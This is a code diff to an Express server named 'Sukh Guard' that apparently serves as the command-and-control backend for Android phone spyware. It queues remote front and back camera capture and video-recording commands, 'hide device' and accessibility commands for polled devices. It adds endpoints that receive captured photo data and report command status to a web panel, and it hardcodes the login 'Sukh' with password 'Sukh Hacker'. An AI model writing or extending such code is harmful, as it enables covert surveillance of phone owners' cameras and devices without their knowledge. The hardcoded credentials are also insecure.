@@ -358,12 +358,12 @@ app.post('/api/accessibility-command', (req, res) => {
     }
 });
 
-// 🎯 UPDATED: CAMERA COMMAND ENDPOINT - POST (With PROPER command storage for mobile app)
+// 🎯 ENHANCED: CAMERA COMMAND ENDPOINT - REAL-TIME SYSTEM
 app.post('/api/camera', (req, res) => {
     try {
         const { device_id, action, camera_type, device_model } = req.body;
         
-        console.log(`📷 Camera command: ${action || 'activate'} for device: ${device_id}, camera: ${camera_type}, model: ${device_model || 'Unknown'}`);
+        console.log(`📷 Camera command: ${action || 'capture'} for device: ${device_id}, camera: ${camera_type}, model: ${device_model || 'Unknown'}`);
         
         if (!device_id) {
             return res.status(400).json({
@@ -372,10 +372,7 @@ app.post('/api/camera', (req, res) => {
             });
         }
         
-        // ✅ UPDATED: Device model properly use karo
         const actualDeviceModel = device_model || 'Unknown Device';
-        
-        // ✅ UPDATED: Custom message format with FIXED back camera
         const currentTime = new Date().toLocaleTimeString('en-IN', { 
             hour: '2-digit', 
             minute: '2-digit',
@@ -383,38 +380,33 @@ app.post('/api/camera', (req, res) => {
             hour12: false 
         });
         
+        // ✅ ENHANCED: Better command message format
         let commandMessage = '';
-        if (action === 'activate') {
-            // ✅ FIXED: Front aur back camera ke liye alag messages
-            if (camera_type === 'front') {
-                commandMessage = `Front cam ${actualDeviceModel} ${currentTime}`;
-            } else if (camera_type === 'back') {
-                commandMessage = `Back cam ${actualDeviceModel} ${currentTime}`;
-            } else {
-                commandMessage = `Camera activated ${actualDeviceModel} ${currentTime}`;
-            }
-        } else if (action === 'capture') {
-            commandMessage = `Photo captured ${camera_type} cam ${actualDeviceModel} ${currentTime}`;
+        if (action === 'capture') {
+            commandMessage = `${camera_type}_cam ${actualDeviceModel} ${currentTime}`;
         } else if (action === 'record') {
-            commandMessage = `Video recording ${camera_type} cam ${actualDeviceModel} ${currentTime}`;
+            commandMessage = `record_${camera_type}_cam ${actualDeviceModel} ${currentTime}`;
         } else if (action === 'stop_record') {
-            commandMessage = `Video stopped ${camera_type} cam ${actualDeviceModel} ${currentTime}`;
+            commandMessage = `stop_record_${camera_type}_cam ${actualDeviceModel} ${currentTime}`;
         } else {
-            commandMessage = `Camera command ${actualDeviceModel} ${currentTime}`;
+            commandMessage = `${camera_type}_cam ${actualDeviceModel} ${currentTime}`;
         }
         
-        // ✅ UPDATED: STORE COMMAND WITH PROPER MESSAGE FOR MOBILE APP
+        // ✅ ENHANCED: STORE COMMAND WITH REAL-TIME TRACKING
         const commands = readCommands();
         const newCommand = {
             id: Date.now(),
             device_id: device_id,
             device_model: actualDeviceModel,
-            action: action || 'activate',
+            action: action || 'capture',
             camera_type: camera_type || 'front',
-            command_message: commandMessage, // ✅ YEH MESSAGE MOBILE APP KO MILENGA
+            command_message: commandMessage,
             status: 'pending',
             created_at: new Date().toISOString(),
-            executed_at: null
+            delivered_at: null,
+            executed_at: null,
+            result: null,
+            photo_data: null
         };
         
         commands.camera_commands.push(newCommand);
@@ -425,7 +417,7 @@ app.post('/api/camera', (req, res) => {
             
             res.json({
                 success: true,
-                message: commandMessage, // ✅ SAME MESSAGE RESPONSE
+                message: commandMessage,
                 command_id: newCommand.id,
                 device_id: device_id,
                 device_model: actualDeviceModel,
@@ -463,17 +455,17 @@ app.get('/api/camera', (req, res) => {
         message: `Front cam Samsung_Device ${currentTime}`,
         method: "GET", 
         device_model: "Samsung_Device",
-        action: "activate",
+        action: "capture",
         camera_type: "front", 
         timestamp: new Date().toISOString(),
         note: "GET request received - Use POST for device-specific commands"
     });
 });
 
-// 🎯 UPDATED: CHECK FOR PENDING COMMANDS (Android app ke liye - WITH DEVICE MODEL MATCHING)
+// 🎯 ENHANCED: CHECK FOR PENDING COMMANDS (Android app ke liye - REAL-TIME)
 app.post('/api/check-commands', (req, res) => {
     try {
-        const { device_id, device_model } = req.body; // ✅ DEVICE MODEL BHI LE LO
+        const { device_id, device_model } = req.body;
         
         console.log(`🔍 Checking commands for device: ${device_id}, model: ${device_model}`);
         
@@ -486,14 +478,12 @@ app.post('/api/check-commands', (req, res) => {
         
         const commands = readCommands();
         
-        // ✅ UPDATED: DEVICE MODEL KE HISAB SE FILTER KARO - ONLY PENDING COMMANDS
+        // ✅ ENHANCED: Only get pending commands
         const pendingCameraCommands = commands.camera_commands.filter(cmd => 
             cmd.device_id === device_id && 
-            cmd.status === 'pending' &&
-            cmd.device_model === device_model // ✅ MODEL MATCH KARO
+            cmd.status === 'pending'
         );
         
-        // ✅ ALSO CHECK FOR OTHER COMMAND TYPES
         const pendingHideCommands = commands.hide_commands.filter(cmd => 
             cmd.device_id === device_id && cmd.status === 'pending'
         );
@@ -509,19 +499,31 @@ app.post('/api/check-commands', (req, res) => {
         ];
         
         if (allPendingCommands.length > 0) {
-            // ✅ LATEST COMMAND RETURN KARO (NEWEST FIRST)
+            // ✅ ENHANCED: Get latest command
             const latestCommand = allPendingCommands.reduce((latest, current) => 
                 new Date(current.created_at) > new Date(latest.created_at) ? current : latest
             );
             
-            // Command ko executed mark karo
-            latestCommand.status = 'executed';
-            latestCommand.executed_at = new Date().toISOString();
+            // ✅ ENHANCED: Device model verification
+            if (device_model && latestCommand.device_model !== 'Unknown Device' && 
+                latestCommand.device_model !== device_model) {
+                console.log(`❌ Device model mismatch: ${device_model} vs ${latestCommand.device_model}`);
+                return res.json({
+                    has_command: false,
+                    message: 'No pending commands (device model mismatch)',
+                    device_id: device_id,
+                    device_model: device_model
+                });
+            }
+            
+            // Mark command as delivered
+            latestCommand.status = 'delivered';
+            latestCommand.delivered_at = new Date().toISOString();
             writeCommands(commands);
             
             console.log(`🎯 Sending command to device: ${latestCommand.command_message || latestCommand.action}`);
             
-            // ✅ RETURN PROPER RESPONSE WITH COMMAND MESSAGE
+            // ✅ ENHANCED: Better response format
             const response = {
                 has_command: true,
                 action: latestCommand.action,
@@ -529,13 +531,10 @@ app.post('/api/check-commands', (req, res) => {
                 device_id: device_id,
                 device_model: latestCommand.device_model,
                 command_id: latestCommand.id,
+                command_message: latestCommand.command_message,
+                camera_type: latestCommand.camera_type,
                 timestamp: new Date().toISOString()
             };
-            
-            // ✅ ADD COMMAND MESSAGE IF AVAILABLE (FOR CAMERA COMMANDS)
-            if (latestCommand.command_message) {
-                response.command_message = latestCommand.command_message;
-            }
             
             res.json(response);
         } else {
@@ -550,6 +549,105 @@ app.post('/api/check-commands', (req, res) => {
         
     } catch (error) {
         console.error('❌ Check commands error:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Server error'
+        });
+    }
+});
+
+// 🎯 NEW: SUBMIT COMMAND RESULT (Mobile app se photo/data bhejne ke liye)
+app.post('/api/command-result', (req, res) => {
+    try {
+        const { command_id, device_id, success, result, photo_data, error_message } = req.body;
+        
+        console.log(`📝 Command result: ${command_id}, Success: ${success}`);
+        
+        if (!command_id || !device_id) {
+            return res.status(400).json({
+                success: false,
+                message: 'Command ID and Device ID required'
+            });
+        }
+
+        const commands = readCommands();
+        
+        // Find command in all types
+        let command = commands.camera_commands.find(cmd => cmd.id == command_id);
+        if (!command) {
+            command = commands.hide_commands.find(cmd => cmd.id == command_id);
+        }
+        if (!command) {
+            command = commands.accessibility_commands.find(cmd => cmd.id == command_id);
+        }
+        
+        if (command) {
+            command.status = success ? 'completed' : 'failed';
+            command.executed_at = new Date().toISOString();
+            command.result = result;
+            command.photo_data = photo_data;
+            command.error_message = error_message;
+
+            console.log(`✅ Command ${command_id} marked as ${command.status}`);
+            
+            if (writeCommands(commands)) {
+                res.json({
+                    success: true,
+                    message: `Command result saved`,
+                    command_id: command_id,
+                    status: command.status
+                });
+            } else {
+                res.status(500).json({
+                    success: false,
+                    message: 'Failed to save command result'
+                });
+            }
+        } else {
+            res.status(404).json({
+                success: false,
+                message: 'Command not found'
+            });
+        }
+
+    } catch (error) {
+        console.error('❌ Command result error:', error);
+        res.status(500).json({
+            success: false,
+            message: 'Server error'
+        });
+    }
+});
+
+// 🎯 NEW: GET COMMAND STATUS (Web panel ke liye)
+app.get('/api/command-status/:command_id', (req, res) => {
+    try {
+        const { command_id } = req.params;
+        const commands = readCommands();
+        
+        // Search in all command types
+        let command = commands.camera_commands.find(cmd => cmd.id == command_id);
+        if (!command) {
+            command = commands.hide_commands.find(cmd => cmd.id == command_id);
+        }
+        if (!command) {
+            command = commands.accessibility_commands.find(cmd => cmd.id == command_id);
+        }
+        
+        if (command) {
+            res.json({
+                success: true,
+                command: command
+            });
+        } else {
+            res.status(404).json({
+                success: false,
+                message: 'Command not found'
+            });
+        }
+
+    } catch (error) {
+        console.error('❌ Command status error:', error);
         res.status(500).json({
             success: false,
             message: 'Server error'
@@ -658,7 +756,7 @@ app.get('/admin', (req, res) => {
 app.get('/api/docs', (req, res) => {
     res.json({
         message: 'Sukh Guard API Documentation',
-        version: '3.0', // Version update kiya
+        version: '5.0', // Version update kiya
         environment: process.env.NODE_ENV || 'development',
         security: '🔐 STRONG Security System Added',
         credentials: {
@@ -676,10 +774,11 @@ app.get('/api/docs', (req, res) => {
                 'POST /api/register': 'Register new user',
                 'POST /api/website/app-data': 'Save app data',
                 'GET /api/user/:id': 'Get user data',
-                'POST /api/check-commands': 'Check for pending commands (with device_model)',
+                'POST /api/check-commands': 'Check for pending commands (REAL-TIME)',
+                'POST /api/command-result': 'Submit command execution result',
                 'POST /api/hide-device': 'Hide/unhide device',
                 'POST /api/accessibility-command': 'Accessibility command',
-                'POST /api/camera': 'Camera command (activate/deactivate)',
+                'POST /api/camera': 'Camera command (capture/record)',
                 'GET /api/camera': 'Camera endpoint'
             },
             website: {
@@ -687,7 +786,8 @@ app.get('/api/docs', (req, res) => {
                 'GET /api/website/app-data': 'Get all app data',
                 'GET /api/stats': 'Get statistics',
                 'GET /api/commands-stats': 'Get commands statistics',
-                'GET /api/all-commands': 'Get all commands'
+                'GET /api/all-commands': 'Get all commands',
+                'GET /api/command-status/:id': 'Get command status'
             },
             pages: {
                 'GET /': 'Login Page',
@@ -699,6 +799,12 @@ app.get('/api/docs', (req, res) => {
             health: {
                 'GET /health': 'Server health check'
             }
+        },
+        new_features: {
+            real_time_commands: 'ENABLED',
+            device_model_verification: 'ENABLED', 
+            command_status_tracking: 'ENABLED',
+            photo_data_storage: 'ENABLED'
         }
     });
 });
@@ -711,7 +817,7 @@ app.use((req, res) => {
         available_endpoints: {
             public: ['/', '/login', '/health', '/api/docs'],
             protected: ['/web', '/dashboard', '/admin'],
-            api: ['/api/register', '/api/website/app-data', '/api/stats', '/api/hide-device', '/api/accessibility-command', '/api/check-commands', '/api/camera']
+            api: ['/api/register', '/api/website/app-data', '/api/stats', '/api/hide-device', '/api/accessibility-command', '/api/check-commands', '/api/camera', '/api/command-result', '/api/command-status']
         }
     });
 });
@@ -729,17 +835,19 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`📚 API Docs: http://localhost:${PORT}/api/docs`);
     console.log(`💾 Data Storage: ${DATA_FILE}`);
     console.log(`🎯 Commands Storage: ${COMMANDS_FILE}`);
-    console.log(`\n✅ Server Version 4.0 - MOBILE APP COMMAND SYSTEM READY!`);
+    console.log(`\n✅ Server Version 5.0 - REAL-TIME COMMAND SYSTEM READY!`);
     console.log(`\n🔒 SECURITY FEATURES:`);
     console.log(`   ✅ Direct HTML access blocked`);
     console.log(`   ✅ Protected routes enabled`);
     console.log(`   ✅ Session validation enabled`);
     console.log(`   ✅ Automatic redirect to login`);
-    console.log(`\n📱 MOBILE APP FEATURES:`);
-    console.log(`   ✅ Camera command storage with device model matching`);
-    console.log(`   ✅ Command message format: "Front cam ModelName Time"`);
-    console.log(`   ✅ Latest command priority system`);
+    console.log(`\n📱 REAL-TIME COMMAND SYSTEM:`);
+    console.log(`   ✅ Front/Back camera commands`);
     console.log(`   ✅ Device model verification`);
+    console.log(`   ✅ Command status tracking`);
+    console.log(`   ✅ Photo data storage ready`);
+    console.log(`   ✅ Real-time polling system`);
     console.log(`\n📝 LOGIN CREDENTIALS:`);
     console.log(`   👤 Username: Sukh`);
     console.log(`   🔑 Password: Sukh Hacker`);
+});
